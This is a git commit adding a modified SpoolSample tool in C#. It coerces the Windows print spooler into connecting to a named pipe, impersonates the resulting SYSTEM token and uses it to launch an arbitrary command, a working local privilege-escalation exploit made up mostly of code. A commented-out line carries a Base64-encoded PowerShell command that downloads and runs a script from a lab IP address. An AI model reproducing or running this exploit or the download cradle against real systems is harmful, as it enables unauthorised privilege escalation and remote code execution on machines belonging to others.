1a867e89afb6e6dde2be40edc9d55556ab4d0d55
weev3 <kyawminthein1337@gmail.com>
2022-08-03 13:31:02 +0800

    Initial Commit

---
+++ SpoolSampleModified/Impersonate.cs
@@ -0,0 +1,158 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Security.Principal;
+
+namespace Impersonate
+{
+    public class Program
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SID_AND_ATTRIBUTES
+        {
+            public IntPtr Sid;
+            public int Attributes;
+        }
+        public struct TOKEN_USER
+        {
+            public SID_AND_ATTRIBUTES User;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        public enum CreationFlags
+        {
+            DefaultErrorMode = 0x04000000,
+            NewConsole = 0x00000010,
+            NewProcessGroup = 0x00000200,
+            SeparateWOWVDM = 0x00000800,
+            Suspended = 0x00000004,
+            UnicodeEnvironment = 0x00000400,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint
+        dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint
+        nDefaultTimeOut, IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        [DllImport("Advapi32.dll")]
+        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetCurrentThread();
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool
+        OpenAsSelf, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass,
+        IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+
+        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint
+        dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType,
+        out IntPtr phNewToken);
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool RevertToSelf();
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
+        [DllImport("userenv.dll", SetLastError = true)]
+        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken,
+        bool bInherit);
+
+        public static void RunImpersonate(String args, String command)
+        {
+            string pipeName = args;
+            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            ImpersonateNamedPipeClient(hPipe);
+
+            IntPtr hToken;
+            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+
+            int TokenInfLength = 0;
+            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
+            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+
+            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
+            IntPtr pstr = IntPtr.Zero;
+            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
+            string sidstr = Marshal.PtrToStringAuto(pstr);
+            Console.WriteLine(@"Found sid {0}", sidstr);
+            IntPtr hSystemToken = IntPtr.Zero;
+            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+
+            StringBuilder sbSystemDir = new StringBuilder(256);
+            uint res1 = GetSystemDirectory(sbSystemDir, 256);
+            IntPtr env = IntPtr.Zero;
+            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);
+            String name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine("Impersonated user is: " + name);
+            RevertToSelf();
+
+
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            STARTUPINFO si = new STARTUPINFO();
+            si.cb = Marshal.SizeOf(si);
+            si.lpDesktop = "WinSta0\\Default";
+            RevertToSelf();
+
+            //CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Sta -Nop -Window Hidden -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADYAMgAvAGUAeABhAG0ALwBkAG8AdwBuAGwAbwBhAGQALgBwAHMAMQAnACkAIAB8ACAASQBFAFgA", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
+            CreateProcessWithTokenW(hSystemToken, 0, null, command, 0, IntPtr.Zero, null, ref si, out pi);
+            Console.WriteLine("Done");
+        }
+    }
+}
---
+++ SpoolSampleModified/SpoolSample.cs
@@ -0,0 +1,43 @@
+﻿using System;
+using System.Text;
+using RDI;
+using Impersonate;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace SpoolSample
+{
+    class SpoolSample
+    {
+        // desktop-pouorrf desktop-pouorrf/pipe/test
+        // \\.\pipe\test\pipe\spoolss
+        // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
+
+        public static void Inject(String arg, String command)
+        {
+            Console.WriteLine("Creating Pipe");
+            Impersonate.Program.RunImpersonate(arg, command);
+        }
+
+        public static void Sample(String arg1, String arg2)
+        {
+            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{arg1} \\\\{arg2}");
+            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
+        }
+        static void Main(string[] args)
+        {
+            if (args.Length != 3)
+            {
+                Console.WriteLine("Invalid number of args. Syntax: Program.exe TARGET PIPENAME (eg. desktop-pouorrf desktop-pouorrf/pipe/test calc.exe)");
+                return;
+            }
+            String arg1 = args[0];
+            String arg2 = args[0] + "/pipe/" + args[1];
+            String arg3 = "\\\\.\\pipe\\" + args[1] + "\\pipe\\spoolss";
+            String arg4 = args[2];
+            Parallel.Invoke(() => Inject(arg3, arg4),
+                () => Sample(arg1, arg2));
+            Console.WriteLine("Doneee");
+        }
+    }
+}
